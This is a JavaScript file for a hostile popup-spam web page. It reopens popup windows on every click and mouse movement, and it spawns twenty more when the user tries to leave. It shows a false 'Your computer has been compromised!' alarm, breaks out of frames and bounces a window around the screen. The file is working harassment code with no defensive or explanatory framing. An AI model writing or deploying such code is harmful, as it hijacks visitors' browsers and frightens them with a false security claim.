if (top.location !== location) {
  top.location.href = location.href;
}

function reopenPopup() {
  window.open(
    "popup.html",
    "",
    "blankmenubar=no,status=no,toolbar=no,resizable=no,width=350,height=370,titlebar=no,alwaysRaised=yes"
  );
}

function spamUser() {
  for (var i = 0; i < 20; i++) {
    reopenPopup();
  }
  return "Your computer has been compromised!";
}

function init() {
  document.body.onclick = reopenPopup;
  document.body.onmouseover = reopenPopup;
  document.body.onmousemove = reopenPopup;
  window.onunload = spamUser;
  window.onbeforeunload = spamUser;
  playWithBall();
  if (bookmarkPage) {
    bookmarkPage();
  }
  reopenPopup();
  setTimeout(function () {
    window.close();
  }, 15000);
}

var xOffset = 10,
  yOffset = 10,
  xPos = 400,
  yPos = -100,
  isRunning = true;

function newXLeft() {
  xOffset = Math.ceil(Math.random() * -10) * 10 - 20;
  window.focus();
}

function newXRight() {
  xOffset = Math.ceil(Math.random() * 10) * 10 - 20;
}

function newYUp() {
  yOffset = Math.ceil(Math.random() * -10) * 10 - 20;
}

function newYDown() {
  yOffset = Math.ceil(Math.random() * 10) * 10 - 20;
}

function stopMovement() {
  isRunning = false;
}

function playWithBall() {
  xPos += xOffset;
  yPos += yOffset;
  if (xPos > screen.width - 175) {
    newXLeft();
  }
  if (xPos < 0) {
    newXRight();
  }
  if (yPos > screen.height - 100) {
    newYUp();
  }
  if (yPos < 0) {
    newYDown();
  }
  if (isRunning) {
    window.moveTo(xPos, yPos);
    setTimeout(playWithBall, 1);
  }
}
